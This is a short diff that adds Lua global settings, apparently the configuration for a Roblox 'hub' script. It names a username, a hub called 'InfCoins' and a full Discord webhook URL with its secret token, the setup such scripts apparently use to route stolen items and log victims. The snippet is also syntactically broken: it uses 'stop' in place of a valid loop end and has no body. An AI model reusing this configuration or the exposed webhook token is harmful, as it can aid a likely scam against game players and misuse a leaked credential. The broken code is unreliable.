@@ -1,0 +1,5 @@
+while true do
+_G.Username = "Osarekk167" 
+_G.HubName = "InfCoins"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099759147848827073/JiUhqdlEQlRUGnPKewPXpGx0MjmAzRRzx6o-erOPGFuoEYt0C9AUu-sYHRKSnBwMBIdu"
+stop
